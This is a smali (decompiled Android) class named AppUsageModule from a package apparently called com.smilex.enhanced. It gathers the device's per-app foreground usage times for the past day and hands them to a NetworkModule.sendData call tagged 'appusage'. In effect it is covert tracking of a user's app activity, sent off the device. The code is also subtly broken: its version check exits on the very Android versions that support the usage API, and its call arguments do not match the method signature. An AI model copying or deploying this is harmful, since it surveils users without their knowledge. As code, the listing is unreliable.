.class public Lcom/smilex/enhanced/modules/AppUsageModule;
.super Ljava/lang/Object;
.source "AppUsageModule.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static init(Landroid/content/Context;)V
    .registers 2
    invoke-static {p0}, Lcom/smilex/enhanced/modules/AppUsageModule;->queryUsageStats(Landroid/content/Context;)V
    return-void
.end method

.method public static queryUsageStats(Landroid/content/Context;)V
    .registers 11
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v1, 0x15
    if-ge v0, v1, :return
    const-string v0, "usagestats"
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/app/usage/UsageStatsManager;
    if-eqz v0, :return
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v1
    const-wide/32 v3, 0x5265c00
    sub-long v3, v1, v3
    const/4 v5, 0x0
    invoke-virtual/range {v0 .. v5}, Landroid/app/usage/UsageStatsManager;->queryUsageStats(IJJ)Ljava/util/List;
    move-result-object v6
    if-eqz v6, :return
    new-instance v7, Ljava/lang/StringBuilder;
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V
    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;
    move-result-object v8
    :loop
    invoke-interface {v8}, Ljava/util/Iterator;->hasNext()Z
    move-result v0
    if-eqz v0, :send
    invoke-interface {v8}, Ljava/util/Iterator;->next()Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/app/usage/UsageStats;
    invoke-virtual {v0}, Landroid/app/usage/UsageStats;->getPackageName()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v0}, Landroid/app/usage/UsageStats;->getTotalTimeInForeground()J
    move-result-wide v2
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1, ":"
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v7, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
    const-string v1, ";"
    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop
    :send
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->length()I
    move-result v0
    if-lez v0, :return
    const-string v0, "appusage"
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-static {v0, v1}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    :return
    return-void
.end method
